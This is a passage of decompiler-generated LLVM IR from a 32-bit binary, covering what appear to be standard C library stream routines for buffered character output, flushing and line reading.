  br label %dec_label_pc_804cf88

dec_label_pc_804cf69:                             ; preds = %dec_label_pc_804cf58
  %v1_804cf69 = add i32 %arg3, 56
  store i32 %v1_804cf69, i32* @ebx, align 4
  store i32 %v12_804cf5b, i32* @eax, align 4
  %v2_804cf78 = call i32 @function_804f65e(i32 %v12_804cf5b, i32 134542939)
  %v0_804cf7d = load i32, i32* @ebx, align 4
  %v1_804cf80 = call i32 @function_804f65b(i32 %v0_804cf7d)
  %v0_804cf89.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804cf88

dec_label_pc_804cf88:                             ; preds = %dec_label_pc_804cf58.dec_label_pc_804cf88_crit_edge, %dec_label_pc_804cf69
  %v0_804cf89 = phi i32 [ %arg3, %dec_label_pc_804cf58.dec_label_pc_804cf88_crit_edge ], [ %v0_804cf89.pre, %dec_label_pc_804cf69 ]
  %v0_804cf88 = load i32, i32* @edx, align 4
  %v4_804cf92 = inttoptr i32 %arg1 to i8*
  %v5_804cf92 = call i32 @function_804d2e4(i8* %v4_804cf92, i32 %arg2, i32 %v0_804cf89, i32 %v0_804cf88)
  store i32 %v5_804cf92, i32* %ebx.global-to-local, align 4
  br i1 %v1_804cf67, label %dec_label_pc_804cfb1, label %dec_label_pc_804cfa0

dec_label_pc_804cfa0:                             ; preds = %dec_label_pc_804cf88
  store i32 %v12_804cf5b, i32* @eax, align 4
  %v2_804cfa9 = call i32 @function_804f65e(i32 %v12_804cf5b, i32 1)
  %v0_804cfb4.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804cfb1

dec_label_pc_804cfb1:                             ; preds = %dec_label_pc_804cf88, %dec_label_pc_804cfa0
  %v0_804cfb4 = phi i32 [ %v5_804cf92, %dec_label_pc_804cf88 ], [ %v0_804cfb4.pre, %dec_label_pc_804cfa0 ]
  store i32 %v0_804cf5a, i32* @ebx, align 4
  store i32 %v0_804cf59, i32* @esi, align 4
  store i32 %v0_804cf58, i32* @edi, align 4
  ret i32 %v0_804cfb4

; uselistorder directives
  uselistorder i32 %v12_804cf5b, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804cfb1, { 1, 0 }
  uselistorder label %dec_label_pc_804cf88, { 1, 0 }
}

define i32 @function_804cfbc(i8 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804cfbc:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_804cfbc = load i32, i32* @edi, align 4
  %v0_804cfbd = load i32, i32* @esi, align 4
  %v0_804cfbe = load i32, i32* @ebx, align 4
  %v12_804cfbf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg2, i32* @esi, align 4
  %v4_804cfc6 = sext i8 %arg1 to i32
  store i32 %v4_804cfc6, i32* @edi, align 4
  %v1_804cfca = add i32 %arg2, 52
  %v2_804cfca = inttoptr i32 %v1_804cfca to i32*
  %v3_804cfca = load i32, i32* %v2_804cfca, align 4
  %v4_804cfca = icmp eq i32 %v3_804cfca, 0
  br i1 %v4_804cfca, label %dec_label_pc_804cff2, label %dec_label_pc_804cfd0

dec_label_pc_804cfd0:                             ; preds = %dec_label_pc_804cfbc
  %v1_804cfd0 = add i32 %arg2, 16
  %v2_804cfd0 = inttoptr i32 %v1_804cfd0 to i32*
  %v3_804cfd0 = load i32, i32* %v2_804cfd0, align 4
  store i32 %v3_804cfd0, i32* %eax.global-to-local, align 4
  %v2_804cfd3 = add i32 %arg2, 28
  %v3_804cfd3 = inttoptr i32 %v2_804cfd3 to i32*
  %v4_804cfd3 = load i32, i32* %v3_804cfd3, align 4
  %v10_804cfd3 = icmp ult i32 %v3_804cfd0, %v4_804cfd3
  %v1_804cfd6 = icmp eq i1 %v10_804cfd3, false
  br i1 %v1_804cfd6, label %dec_label_pc_804cfe5, label %dec_label_pc_804cfd8

dec_label_pc_804cfd8:                             ; preds = %dec_label_pc_804cfd0
  store i32 %v4_804cfc6, i32* %edx.global-to-local, align 4
  %v3_804cfda = inttoptr i32 %v3_804cfd0 to i8*
  store i8 %arg1, i8* %v3_804cfda, align 1
  %v0_804cfdc = load i32, i32* %edx.global-to-local, align 4
  %v1_804cfdc = urem i32 %v0_804cfdc, 256
  store i32 %v1_804cfdc, i32* %ebx.global-to-local, align 4
  %v0_804cfdf = load i32, i32* %eax.global-to-local, align 4
  %v1_804cfdf = add i32 %v0_804cfdf, 1
  store i32 %v1_804cfdf, i32* %eax.global-to-local, align 4
  %v1_804cfe0 = load i32, i32* @esi, align 4
  %v2_804cfe0 = add i32 %v1_804cfe0, 16
  %v3_804cfe0 = inttoptr i32 %v2_804cfe0 to i32*
  store i32 %v1_804cfdf, i32* %v3_804cfe0, align 4
  br label %dec_label_pc_804d045

dec_label_pc_804cfe5:                             ; preds = %dec_label_pc_804cfd0
  %v4_804cfe9 = call i32 @function_804d350(i8 %arg1, i32 %arg2)
  store i32 %v4_804cfe9, i32* %eax.global-to-local, align 4
  store i32 %v4_804cfe9, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d042

dec_label_pc_804cff2:                             ; preds = %dec_label_pc_804cfbc
  %v1_804cff2 = add i32 %arg2, 56
  store i32 %v1_804cff2, i32* @ebx, align 4
  store i32 %v12_804cfbf, i32* @eax, align 4
  %sext = mul i32 %v12_804cfbf, 16777216
  %v1_804d001 = sdiv i32 %sext, 16777216
  %v3_804d001 = call i32 @function_804f65e(i32 %v1_804d001, i32 134542939)
  store i32 %v3_804d001, i32* %eax.global-to-local, align 4
  %v0_804d006 = load i32, i32* @ebx, align 4
  %sext3 = mul i32 %v0_804d006, 16777216
  %v1_804d009 = sdiv i32 %sext3, 16777216
  %v2_804d009 = call i32 @function_804f65b(i32 %v1_804d009)
  store i32 %v2_804d009, i32* %eax.global-to-local, align 4
  %v0_804d00e = load i32, i32* @esi, align 4
  %v1_804d00e = add i32 %v0_804d00e, 16
  %v2_804d00e = inttoptr i32 %v1_804d00e to i32*
  %v3_804d00e = load i32, i32* %v2_804d00e, align 4
  store i32 %v3_804d00e, i32* %eax.global-to-local, align 4
  %v2_804d014 = add i32 %v0_804d00e, 28
  %v3_804d014 = inttoptr i32 %v2_804d014 to i32*
  %v4_804d014 = load i32, i32* %v3_804d014, align 4
  %v10_804d014 = icmp ult i32 %v3_804d00e, %v4_804d014
  %v1_804d017 = icmp eq i1 %v10_804d014, false
  %v0_804d029 = load i32, i32* @edi, align 4
  br i1 %v1_804d017, label %dec_label_pc_804d026, label %dec_label_pc_804d019

dec_label_pc_804d019:                             ; preds = %dec_label_pc_804cff2
  store i32 %v0_804d029, i32* %edx.global-to-local, align 4
  %v1_804d01b = trunc i32 %v0_804d029 to i8
  %v3_804d01b = inttoptr i32 %v3_804d00e to i8*
  store i8 %v1_804d01b, i8* %v3_804d01b, align 1
  %v0_804d01d = load i32, i32* %edx.global-to-local, align 4
  %v1_804d01d = urem i32 %v0_804d01d, 256
  store i32 %v1_804d01d, i32* %ebx.global-to-local, align 4
  %v0_804d020 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d020 = add i32 %v0_804d020, 1
  store i32 %v1_804d020, i32* %eax.global-to-local, align 4
  %v1_804d021 = load i32, i32* @esi, align 4
  %v2_804d021 = add i32 %v1_804d021, 16
  %v3_804d021 = inttoptr i32 %v2_804d021 to i32*
  store i32 %v1_804d020, i32* %v3_804d021, align 4
  br label %dec_label_pc_804d034

dec_label_pc_804d026:                             ; preds = %dec_label_pc_804cff2
  %v5_804d029 = trunc i32 %v0_804d029 to i8
  %v4_804d02a = call i32 @function_804d350(i8 %v5_804d029, i32 %v0_804d00e)
  store i32 %v4_804d02a, i32* %eax.global-to-local, align 4
  store i32 %v4_804d02a, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d034

dec_label_pc_804d034:                             ; preds = %dec_label_pc_804d019, %dec_label_pc_804d026
  store i32 %v12_804cfbf, i32* @eax, align 4
  %v3_804d03d = call i32 @function_804f65e(i32 %v1_804d001, i32 1)
  store i32 %v3_804d03d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d042

dec_label_pc_804d042:                             ; preds = %dec_label_pc_804cfe5, %dec_label_pc_804d034
  br label %dec_label_pc_804d045

dec_label_pc_804d045:                             ; preds = %dec_label_pc_804cfd8, %dec_label_pc_804d042
  %v0_804d048 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804d048, i32* %eax.global-to-local, align 4
  store i32 %v0_804cfbe, i32* @ebx, align 4
  store i32 %v0_804cfbd, i32* @esi, align 4
  store i32 %v0_804cfbc, i32* @edi, align 4
  ret i32 %v0_804d048

; uselistorder directives
  uselistorder i32 %v0_804d029, { 2, 1, 0 }
  uselistorder i32 %v1_804d001, { 1, 0 }
  uselistorder i32 %v12_804cfbf, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_804d045, { 1, 0 }
  uselistorder label %dec_label_pc_804d042, { 1, 0 }
  uselistorder label %dec_label_pc_804d034, { 1, 0 }
}

define i32 @function_804d0b0() local_unnamed_addr {
dec_label_pc_804d0b0:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_804d0bf = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804d0bf, i32* @eax, align 4
  %v2_804d0c4 = call i32 @function_804f65e(i32 %v2_804d0bf, i32 134542939)
  %v1_804d0d0 = call i32 @function_804f65b(i32 ptrtoint (i32* @global_var_8056218.108 to i32))
  %v0_804d0d5 = load i32, i32* @global_var_80568e0.109, align 32
  %v8_804d0dd = icmp eq i32 %v0_804d0d5, 1
  %v1_804d0de = icmp eq i1 %v8_804d0dd, false
  br i1 %v1_804d0de, label %dec_label_pc_804d175, label %dec_label_pc_804d0e4

dec_label_pc_804d0e4:                             ; preds = %dec_label_pc_804d0b0
  %v0_804d0e4 = load i32, i32* @global_var_80568e4.110, align 4
  %tmp29 = icmp slt i32 %v0_804d0e4, 1
  br i1 %tmp29, label %dec_label_pc_804d175, label %dec_label_pc_804d0f1

dec_label_pc_804d0f1:                             ; preds = %dec_label_pc_804d0e4
  store i32 0, i32* @esi, align 4
  %v2_804d0fe = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_804d0fe, i32* @eax, align 4
  %v2_804d103 = call i32 @function_804f65e(i32 %v2_804d0fe, i32 134542939)
  %v1_804d10f = call i32 @function_804f65b(i32 ptrtoint (i32* @global_var_8056200.117 to i32))
  %v0_804d114 = load i32, i32* bitcast (i32** @global_var_80561fc.118 to i32*), align 4
  store i32 %v0_804d114, i32* %edx.global-to-local, align 4
  %v1_804d1563 = icmp eq i32 %v0_804d114, 0
  %v1_804d15810 = icmp eq i1 %v1_804d1563, false
  br i1 %v1_804d15810, label %dec_label_pc_804d11f, label %dec_label_pc_804d15a

dec_label_pc_804d11f:                             ; preds = %dec_label_pc_804d0f1, %dec_label_pc_804d154
  %v1_804d11f14.in = phi i32 [ %v0_804d154, %dec_label_pc_804d154 ], [ %v0_804d114, %dec_label_pc_804d0f1 ]
  %v1_804d11f14 = inttoptr i32 %v1_804d11f14.in to i16*
  %v2_804d11f = load i16, i16* %v1_804d11f14, align 2
  %v1_804d122 = add i32 %v1_804d11f14.in, 32
  %v2_804d122 = inttoptr i32 %v1_804d122 to i32*
  %v3_804d122 = load i32, i32* %v2_804d122, align 4
  store i32 %v3_804d122, i32* @ebx, align 4
  %v1_804d125 = and i16 %v2_804d11f, -32720
  %v6_804d12a = icmp eq i16 %v1_804d125, 48
  br i1 %v6_804d12a, label %dec_label_pc_804d133, label %dec_label_pc_804d12f

dec_label_pc_804d12f:                             ; preds = %dec_label_pc_804d11f
  store i32 %v1_804d11f14.in, i32* @esi, align 4
  br label %dec_label_pc_804d154

dec_label_pc_804d133:                             ; preds = %dec_label_pc_804d11f
  %v0_804d133 = load i32, i32* @esi, align 4
  %v1_804d133 = icmp eq i32 %v0_804d133, 0
  %v1_804d135 = icmp eq i1 %v1_804d133, false
  br i1 %v1_804d135, label %dec_label_pc_804d13f, label %dec_label_pc_804d137

dec_label_pc_804d137:                             ; preds = %dec_label_pc_804d133
  store i32 %v3_804d122, i32* bitcast (i32** @global_var_80561fc.118 to i32*), align 4
  br label %dec_label_pc_804d142

dec_label_pc_804d13f:                             ; preds = %dec_label_pc_804d133
  %v2_804d13f = add i32 %v0_804d133, 32
  %v3_804d13f = inttoptr i32 %v2_804d13f to i32*
  store i32 %v3_804d122, i32* %v3_804d13f, align 4
  %v0_804d142.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d142

dec_label_pc_804d142:                             ; preds = %dec_label_pc_804d137, %dec_label_pc_804d13f
  %v0_804d14b = phi i32 [ %v1_804d11f14.in, %dec_label_pc_804d137 ], [ %v0_804d142.pre, %dec_label_pc_804d13f ]
  %v1_804d142 = add i32 %v0_804d14b, 1
  %v2_804d142 = inttoptr i32 %v1_804d142 to i8*
  %v3_804d142 = load i8, i8* %v2_804d142, align 1
  %v4_804d142 = and i8 %v3_804d142, 32
  %v5_804d142 = icmp eq i8 %v4_804d142, 0
  br i1 %v5_804d142, label %dec_label_pc_804d154, label %dec_label_pc_804d148

dec_label_pc_804d148:                             ; preds = %dec_label_pc_804d142
  %v1_804d14c = call i32 @function_804eac9(i32 %v0_804d14b)
  br label %dec_label_pc_804d154

dec_label_pc_804d154:                             ; preds = %dec_label_pc_804d142, %dec_label_pc_804d12f, %dec_label_pc_804d148
  %v0_804d154 = load i32, i32* @ebx, align 4
  store i32 %v0_804d154, i32* %edx.global-to-local, align 4
  %v1_804d156 = icmp eq i32 %v0_804d154, 0
  %v1_804d158 = icmp eq i1 %v1_804d156, false
  br i1 %v1_804d158, label %dec_label_pc_804d11f, label %dec_label_pc_804d15a

dec_label_pc_804d15a:                             ; preds = %dec_label_pc_804d154, %dec_label_pc_804d0f1
  store i32 %v2_804d0fe, i32* @eax, align 4
  %v2_804d163 = call i32 @function_804f65e(i32 %v2_804d0fe, i32 1)
  store i32 0, i32* @global_var_80568e4.110, align 4
  %v0_804d175.pre = load i32, i32* @global_var_80568e0.109, align 32
  br label %dec_label_pc_804d175

dec_label_pc_804d175:                             ; preds = %dec_label_pc_804d0e4, %dec_label_pc_804d0b0, %dec_label_pc_804d15a
  %v0_804d175 = phi i32 [ %v0_804d0d5, %dec_label_pc_804d0e4 ], [ %v0_804d0d5, %dec_label_pc_804d0b0 ], [ %v0_804d175.pre, %dec_label_pc_804d15a ]
  %v1_804d17a = add i32 %v0_804d175, -1
  store i32 %v1_804d17a, i32* @global_var_80568e0.109, align 32
  store i32 %v2_804d0bf, i32* @eax, align 4
  %v2_804d189 = call i32 @function_804f65e(i32 %v2_804d0bf, i32 1)
  ret i32 %v2_804d189

; uselistorder directives
  uselistorder i32 %v0_804d154, { 1, 2, 0 }
  uselistorder i32 %v1_804d11f14.in, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804d0d5, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804d175, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d154, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d142, { 1, 0 }
  uselistorder label %dec_label_pc_804d11f, { 1, 0 }
}

define i32 @function_804d194(i16* %arg1) local_unnamed_addr {
dec_label_pc_804d194:
  %stack_var_-32 = alloca i32, align 4
  %v0_804d194 = load i32, i32* @ebp, align 4
  store i32 0, i32* @ebp, align 4
  %v0_804d197 = load i32, i32* @edi, align 4
  %v0_804d198 = load i32, i32* @esi, align 4
  %v0_804d199 = load i32, i32* @ebx, align 4
  %v4_804d19d = ptrtoint i16* %arg1 to i32
  store i32 %v4_804d19d, i32* @ebx, align 4
  %v10_804d1a1 = icmp eq i16* %arg1, inttoptr (i32 134570492 to i16*)
  br i1 %v10_804d1a1, label %dec_label_pc_804d1b5, label %dec_label_pc_804d1a9

dec_label_pc_804d1a9:                             ; preds = %dec_label_pc_804d194
  %v2_804d1a9 = icmp eq i16* %arg1, null
  store i32 256, i32* @ebp, align 4
  %v1_804d1af = icmp eq i1 %v2_804d1a9, false
  br i1 %v1_804d1af, label %dec_label_pc_804d2ad, label %dec_label_pc_804d1b5

dec_label_pc_804d1b5:                             ; preds = %dec_label_pc_804d1a9, %dec_label_pc_804d194
  store i32 0, i32* @edi, align 4
  %v2_804d1c2 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804d1c2, i32* @ebx, align 4
  %v2_804d1c7 = call i32 @function_804f65e(i32 %v2_804d1c2, i32 134542939)
  %v1_804d1d3 = call i32 @function_804f65b(i32 ptrtoint (i32* @global_var_8056218.108 to i32))
  %v0_804d1d8 = load i32, i32* @global_var_80568e0.109, align 32
  store i32 ptrtoint (i32* @global_var_8056218.108 to i32), i32* @ecx, align 4
  %v1_804d1df = add i32 %v0_804d1d8, 1
  store i32 %v1_804d1df, i32* @eax, align 4
  store i32 %v1_804d1df, i32* @global_var_80568e0.109, align 32
  %v2_804d1e8 = call i32 @function_804f65e(i32 %v2_804d1c2, i32 1)
  store i32 %v2_804d1e8, i32* @eax, align 4
  %v2_804d1fb = call i32 @function_804f65e(i32 %v2_804d1c2, i32 134542939)
  %v1_804d207 = call i32 @function_804f65b(i32 ptrtoint (i32* @global_var_8056200.117 to i32))
  %v0_804d20c = load i32, i32* bitcast (i32** @global_var_80561fc.118 to i32*), align 4
  store i32 %v0_804d20c, i32* @esi, align 4
  store i32 ptrtoint (i32* @global_var_8056200.117 to i32), i32* @eax, align 4
  %v2_804d217 = call i32 @function_804f65e(i32 %v2_804d1c2, i32 1)
  %v0_804d29e1 = load i32, i32* @esi, align 4
  %v1_804d29e2 = icmp eq i32 %v0_804d29e1, 0
  %v1_804d2a09 = icmp eq i1 %v1_804d29e2, false
  br i1 %v1_804d2a09, label %dec_label_pc_804d221, label %dec_label_pc_804d2a6

dec_label_pc_804d221:                             ; preds = %dec_label_pc_804d1b5, %dec_label_pc_804d29b
  %v0_804d22f = phi i32 [ %v3_804d29b, %dec_label_pc_804d29b ], [ %v0_804d29e1, %dec_label_pc_804d1b5 ]
  %v1_804d221 = inttoptr i32 %v0_804d22f to i8*
  %v2_804d221 = load i8, i8* %v1_804d221, align 1
  %v3_804d221 = and i8 %v2_804d221, 64
  %v4_804d221 = icmp eq i8 %v3_804d221, 0
  br i1 %v4_804d221, label %dec_label_pc_804d29b, label %dec_label_pc_804d226

dec_label_pc_804d226:                             ; preds = %dec_label_pc_804d221
  %v0_804d226 = load i32, i32* @global_var_8056230.116, align 16
  %v9_804d226 = icmp eq i32 %v0_804d226, 2
  br i1 %v9_804d226, label %dec_label_pc_804d24e, label %dec_label_pc_804d22f

dec_label_pc_804d22f:                             ; preds = %dec_label_pc_804d226
  %v1_804d22f = add i32 %v0_804d22f, 56
  store i32 %v1_804d22f, i32* @ebx, align 4
  store i32 %v2_804d1c2, i32* @eax, align 4
  %v2_804d23e = call i32 @function_804f65e(i32 %v2_804d1c2, i32 134542939)
  %v0_804d243 = load i32, i32* @ebx, align 4
  %v1_804d246 = call i32 @function_804f65b(i32 %v0_804d243)
  %v0_804d24e.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804d24e

dec_label_pc_804d24e:                             ; preds = %dec_label_pc_804d226, %dec_label_pc_804d22f
  %v0_804d261 = phi i32 [ %v0_804d22f, %dec_label_pc_804d226 ], [ %v0_804d24e.pre, %dec_label_pc_804d22f ]
  %v1_804d24e = inttoptr i32 %v0_804d261 to i32*
  %v2_804d24e = load i32, i32* %v1_804d24e, align 4
  %v1_804d250 = load i32, i32* @ebp, align 4
  %v2_804d250 = or i32 %v1_804d250, %v2_804d24e
  %v1_804d252 = and i32 %v2_804d250, 832
  %v2_804d257 = icmp eq i32 %v1_804d252, 320
  %v1_804d25c = icmp eq i1 %v2_804d257, false
  br i1 %v1_804d25c, label %dec_label_pc_804d281, label %dec_label_pc_804d25e

dec_label_pc_804d25e:                             ; preds = %dec_label_pc_804d24e
  %v1_804d262 = call i32 @function_804c2c0(i32 %v0_804d261)
  %v1_804d26a = icmp eq i32 %v1_804d262, 0
  br i1 %v1_804d26a, label %dec_label_pc_804d273, label %dec_label_pc_804d26e

dec_label_pc_804d26e:                             ; preds = %dec_label_pc_804d25e
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_804d281

dec_label_pc_804d273:                             ; preds = %dec_label_pc_804d25e
  %v0_804d273 = load i32, i32* @esi, align 4
  %v1_804d273 = add i32 %v0_804d273, 8
  %v2_804d273 = inttoptr i32 %v1_804d273 to i32*
  %v3_804d273 = load i32, i32* %v2_804d273, align 4
  %v2_804d276 = add i32 %v0_804d273, 28
  %v3_804d276 = inttoptr i32 %v2_804d276 to i32*
  store i32 %v3_804d273, i32* %v3_804d276, align 4
  %v0_804d279 = load i32, i32* @esi, align 4
  %v1_804d279 = inttoptr i32 %v0_804d279 to i32*
  %v2_804d279 = load i32, i32* %v1_804d279, align 4
  %v2_804d279.tr = trunc i32 %v2_804d279 to i16
  %v1_804d27e = and i16 %v2_804d279.tr, -65
  %v3_804d27e = inttoptr i32 %v0_804d279 to i16*
  store i16 %v1_804d27e, i16* %v3_804d27e, align 2
  br label %dec_label_pc_804d281

dec_label_pc_804d281:                             ; preds = %dec_label_pc_804d24e, %dec_label_pc_804d26e, %dec_label_pc_804d273
  %v0_804d281 = load i32, i32* @global_var_8056230.116, align 16
  %v9_804d281 = icmp eq i32 %v0_804d281, 2
  br i1 %v9_804d281, label %dec_label_pc_804d29b, label %dec_label_pc_804d28a

dec_label_pc_804d28a:                             ; preds = %dec_label_pc_804d281
  store i32 %v2_804d1c2, i32* @eax, align 4
  %v2_804d293 = call i32 @function_804f65e(i32 %v2_804d1c2, i32 1)
  br label %dec_label_pc_804d29b

dec_label_pc_804d29b:                             ; preds = %dec_label_pc_804d281, %dec_label_pc_804d221, %dec_label_pc_804d28a
  %v0_804d29b = load i32, i32* @esi, align 4
  %v1_804d29b = add i32 %v0_804d29b, 32
  %v2_804d29b = inttoptr i32 %v1_804d29b to i32*
  %v3_804d29b = load i32, i32* %v2_804d29b, align 4
  store i32 %v3_804d29b, i32* @esi, align 4
  %v1_804d29e = icmp eq i32 %v3_804d29b, 0
  %v1_804d2a0 = icmp eq i1 %v1_804d29e, false
  br i1 %v1_804d2a0, label %dec_label_pc_804d221, label %dec_label_pc_804d2a6

dec_label_pc_804d2a6:                             ; preds = %dec_label_pc_804d29b, %dec_label_pc_804d1b5
  %v0_804d2a6 = call i32 @function_804d0b0()
  br label %dec_label_pc_804d2d7

dec_label_pc_804d2ad:                             ; preds = %dec_label_pc_804d1a9
  store i32 0, i32* @edi, align 4
  %tmp23 = bitcast i16* %arg1 to i8*
  %v3_804d2af = load i8, i8* %tmp23, align 1
  %v4_804d2af = and i8 %v3_804d2af, 64
  %v5_804d2af = icmp eq i8 %v4_804d2af, 0
  br i1 %v5_804d2af, label %dec_label_pc_804d2d7, label %dec_label_pc_804d2b4

dec_label_pc_804d2b4:                             ; preds = %dec_label_pc_804d2ad
  store i32 -1, i32* @edi, align 4
  %v1_804d2bb = call i32 @function_804c2c0(i32 %v4_804d19d)
  %v1_804d2c3 = icmp eq i32 %v1_804d2bb, 0
  %v1_804d2c5 = icmp eq i1 %v1_804d2c3, false
  br i1 %v1_804d2c5, label %dec_label_pc_804d2d7, label %dec_label_pc_804d2c7

dec_label_pc_804d2c7:                             ; preds = %dec_label_pc_804d2b4
  %v2_804d2c7 = add i32 %v4_804d19d, 8
  %v3_804d2c7 = inttoptr i32 %v2_804d2c7 to i32*
  %v4_804d2c7 = load i32, i32* %v3_804d2c7, align 4
  store i32 0, i32* @edi, align 4
  %v3_804d2cc = add i32 %v4_804d19d, 28
  %v4_804d2cc = inttoptr i32 %v3_804d2cc to i32*
  store i32 %v4_804d2c7, i32* %v4_804d2cc, align 4
  %tmp24 = bitcast i16* %arg1 to i32*
  %v3_804d2cf = load i32, i32* %tmp24, align 4
  %v3_804d2cf.tr = trunc i32 %v3_804d2cf to i16
  %v1_804d2d4 = and i16 %v3_804d2cf.tr, -65
  store i16 %v1_804d2d4, i16* %arg1, align 2
  br label %dec_label_pc_804d2d7

dec_label_pc_804d2d7:                             ; preds = %dec_label_pc_804d2b4, %dec_label_pc_804d2ad, %dec_label_pc_804d2a6, %dec_label_pc_804d2c7
  %v0_804d2da = load i32, i32* @edi, align 4
  store i32 %v0_804d199, i32* @ebx, align 4
  store i32 %v0_804d198, i32* @esi, align 4
  store i32 %v0_804d197, i32* @edi, align 4
  store i32 %v0_804d194, i32* @ebp, align 4
  ret i32 %v0_804d2da

; uselistorder directives
  uselistorder i32 %v3_804d29b, { 1, 2, 0 }
  uselistorder i32 %v2_804d1c2, { 2, 3, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @function_804d0b0, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_80561fc.118 to i32*), { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32* @global_var_80568e0.109, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_8056218.108 to i32), { 1, 3, 4, 5, 6, 9, 2, 7, 0, 8 }
  uselistorder i16* %arg1, { 4, 1, 3, 2, 0, 5 }
  uselistorder label %dec_label_pc_804d2d7, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804d29b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d281, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d24e, { 1, 0 }
  uselistorder label %dec_label_pc_804d221, { 1, 0 }
}

define i32 @function_804d2e4(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804d2e4:
  %eax.global-to-local = alloca i32, align 4
  %v0_804d2e4 = load i32, i32* @ebp, align 4
  %v4_804d2ef = ptrtoint i8* %arg1 to i32
  store i32 %v4_804d2ef, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_804d2ef, i32* @ebx, align 4
  %tmp17 = icmp slt i32 %arg2, 1
  %tmp18 = icmp eq i1 %tmp17, false
  br i1 %tmp18, label %dec_label_pc_804d335.preheader, label %dec_label_pc_804d341

dec_label_pc_804d335.preheader:                   ; preds = %dec_label_pc_804d2e4
  %v1_804d33519 = add i32 %arg2, -1
  %v8_804d33520 = icmp eq i32 %v1_804d33519, 0
  store i32 %v1_804d33519, i32* @esi, align 4
  %v1_804d33622 = icmp eq i1 %v8_804d33520, false
  br i1 %v1_804d33622, label %dec_label_pc_804d2ff, label %dec_label_pc_804d338

dec_label_pc_804d2ff:                             ; preds = %dec_label_pc_804d335.preheader, %dec_label_pc_804d333.dec_label_pc_804d335_crit_edge.dec_label_pc_804d2ff_crit_edge
  %v0_804d2ff = phi i32 [ %v0_804d2ff.pre, %dec_label_pc_804d333.dec_label_pc_804d335_crit_edge.dec_label_pc_804d2ff_crit_edge ], [ %arg3, %dec_label_pc_804d335.preheader ]
  %v1_804d2ff = add i32 %v0_804d2ff, 16
  %v2_804d2ff = inttoptr i32 %v1_804d2ff to i32*
  %v3_804d2ff = load i32, i32* %v2_804d2ff, align 4
  store i32 %v3_804d2ff, i32* %eax.global-to-local, align 4
  %v2_804d302 = add i32 %v0_804d2ff, 24
  %v3_804d302 = inttoptr i32 %v2_804d302 to i32*
  %v4_804d302 = load i32, i32* %v3_804d302, align 4
  %v10_804d302 = icmp ult i32 %v3_804d2ff, %v4_804d302
  %v1_804d305 = icmp eq i1 %v10_804d302, false
  br i1 %v1_804d305, label %dec_label_pc_804d315, label %dec_label_pc_804d307

dec_label_pc_804d307:                             ; preds = %dec_label_pc_804d2ff
  %v1_804d307 = inttoptr i32 %v3_804d2ff to i8*
  %v2_804d307 = load i8, i8* %v1_804d307, align 1
  %v3_804d307 = zext i8 %v2_804d307 to i32
  %v4_804d307 = load i32, i32* @edx, align 4
  %v5_804d307 = and i32 %v4_804d307, -256
  %v6_804d307 = or i32 %v5_804d307, %v3_804d307
  store i32 %v6_804d307, i32* @edx, align 4
  %v1_804d309 = add i32 %v3_804d2ff, 1
  store i32 %v1_804d309, i32* %eax.global-to-local, align 4
  %v2_804d30a = load i32, i32* @ebx, align 4
  %v3_804d30a = inttoptr i32 %v2_804d30a to i8*
  store i8 %v2_804d307, i8* %v3_804d30a, align 1
  %v0_804d30c = load i32, i32* @ebx, align 4
  %v1_804d30c = add i32 %v0_804d30c, 1
  store i32 %v1_804d30c, i32* @ebx, align 4
  %v0_804d30d = load i32, i32* @edx, align 4
  %v1_804d30d = trunc i32 %v0_804d30d to i8
  %v10_804d30d = icmp eq i8 %v1_804d30d, 10
  %v0_804d310 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d310 = load i32, i32* @ebp, align 4
  %v2_804d310 = add i32 %v1_804d310, 16
  %v3_804d310 = inttoptr i32 %v2_804d310 to i32*
  store i32 %v0_804d310, i32* %v3_804d310, align 4
  br i1 %v10_804d30d, label %dec_label_pc_804d338, label %dec_label_pc_804d333.dec_label_pc_804d335_crit_edge

dec_label_pc_804d315:                             ; preds = %dec_label_pc_804d2ff
  %v0_804d319 = call i32 @function_80508f0()
  %v1_804d319 = trunc i32 %v0_804d319 to i8
  store i32 %v0_804d319, i32* %eax.global-to-local, align 4
  %sext.mask = urem i32 %v0_804d319, 256
  %v11_804d321 = icmp eq i32 %sext.mask, 255
  %v1_804d324 = icmp eq i1 %v11_804d321, false
